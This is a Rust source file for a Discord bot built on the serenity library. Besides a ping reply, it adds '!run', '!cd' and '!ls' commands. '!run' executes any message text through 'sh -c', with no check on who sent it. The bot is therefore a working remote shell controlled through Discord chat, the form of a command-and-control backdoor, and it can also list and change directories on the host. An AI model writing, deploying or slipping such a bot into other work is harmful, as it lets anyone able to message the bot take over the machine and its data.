use std::env;

use serenity::all::GatewayIntents;
use serenity::async_trait;
use serenity::model::channel::Message;
use serenity::model::gateway::Ready;
use serenity::prelude::*;
use tokio::process::Command;

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    // Set a handler for the `message` event. This is called whenever a new message is received.
    //
    // Event handlers are dispatched through a threadpool, and so multiple events can be
    // dispatched simultaneously.
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "!ping" {
            // Sending a message can fail, due to a network error, an authentication error, or lack
            // of permissions to post in the channel, so log to stdout when some error happens,
            // with a description of it.
            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
                println!("Error sending message: {why:?}");
            }
        }
        if msg.content.starts_with("!run ") {
            let command = msg.content.strip_prefix("!run ").unwrap_or("");
            if let Err(why) = Command::new("sh").arg("-c").arg(command).spawn() {
                println!("Error executing command: {why:?}");
            }
        }
        if msg.content.starts_with("!cd ") {
            let directory = msg.content.strip_prefix("!cd ").unwrap_or("");
            if !directory.is_empty() {
                match env::set_current_dir(directory) {
                    Ok(_) => {
                        if let Err(why) = msg.channel_id.say(&ctx.http, format!("Done")).await {
                            println!("Error sending message: {why:?}");
                        }
                    }
                    Err(why) => println!("Error changing directory: {why:?}"),
                }
            }
        }
        if msg.content == "!ls" {
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd").args(["/C", "dir"]).output()
            } else {
                Command::new("ls").arg("-la").output()
            };

            match output.await {
                Ok(output) => {
                    let result = String::from_utf8_lossy(&output.stdout);
                    let response = format!("```{}```", result);
                    // TODO handle - Error sending message: Model(MessageTooLong(2085))
                    if let Err(why) = msg.channel_id.say(&ctx.http, response).await {
                        println!("Error sending message: {why:?}");
                    }
                }
                Err(why) => {
                    println!("Error retrieving output: {why:?}");
                }
            }
        }
    }

    // Set a handler to be called on the `ready` event. This is called when a shard is booted, and
    // a READY payload is sent by Discord. This payload contains data like the current user's guild
    // Ids, current user data, private channels, and more.
    //
    // In this case, just print what the current user's username is.
    async fn ready(&self, _: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);
    }
}

#[tokio::main]
async fn main() {
    // Configure the client with your Discord bot token in the environment.
    let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");
    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    // Create a new instance of the Client, logging in as a bot. This will automatically prepend
    // your bot token with "Bot ", which is a requirement by Discord for bot users.
    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .expect("Err creating client");

    // Finally, start a single shard, and start listening to events.
    //
    // Shards will automatically attempt to reconnect, and will perform exponential backoff until
    // it reconnects.
    if let Err(why) = client.start().await {
        println!("Client error: {why:?}");
    }
}
